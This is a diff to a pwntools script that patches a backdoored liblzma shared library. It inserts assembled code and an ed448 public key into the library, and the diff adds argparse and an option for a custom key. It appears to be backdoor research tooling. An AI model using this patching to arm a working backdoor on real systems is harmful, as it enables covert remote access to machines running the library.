@@ -1,11 +1,29 @@
 #!/usr/bin/env python3
 import os, sys
-path = sys.argv[1]
-if not os.path.exists(path):
-  print("usage: patch.py <path>")
-  sys.exit(1)
+import argparse
 
 from pwn import *
+
+# ed448 public key for seed 0
+ED448_PUBKEY_SEED0 = (
+    '5b3afe03878a49b28232d4f1a442aebd'
+    'e109f807acef7dfd9a7f65b962fe52d6'
+    '547312cacecff04337508f9d2529a8f1'
+    '669169b21c32c48000'
+)
+
+def valid_hexstring(astring: str) -> str:
+  if len(astring) != 57*2:
+    raise ValueError("invalid ed448 public key length")
+  int(astring, 16) # raise ValueError
+  return astring
+
+parser = argparse.ArgumentParser()
+parser.add_argument('path', help='path to liblzma.so.5.6.{0,1} file')
+parser.add_argument('-pk', '--ed448pubkey', type=valid_hexstring,
+  default=ED448_PUBKEY_SEED0, help='Custom ed448 public key to use')
+args = parser.parse_args()
+
 context.update(arch='amd64', os='linux')
 
 # generate_key bytes from backdoored v5.6.0
@@ -45,21 +63,17 @@ p = asm('''
   nop
 ''')
 
-# ed448 public key for seed 0
-p += unhex('5b3afe03878a49b28232d4f1a442aebd'
-           'e109f807acef7dfd9a7f65b962fe52d6'
-           '547312cacecff04337508f9d2529a8f1'
-           '669169b21c32c48000')
+p += unhex(args.ed448pubkey)
 p += b'\x00' * (flen - len(p))
 
 # patch .so
-with open(path, 'rb') as f:
+with open(args.path, 'rb') as f:
   lzma = f.read()
 if func not in lzma:
   print('Could not identify func')
   sys.exit(1)
 off = lzma.index(func)
 print('Patching func at offset: ' + hex(off))
-with open(path+'.patch', 'wb') as f:
+with open(args.path+'.patch', 'wb') as f:
   f.write(lzma[:off]+p+lzma[off+flen:])
-print('Generated patched so: ' + path+'.patch')
+print('Generated patched so: ' + args.path+'.patch')
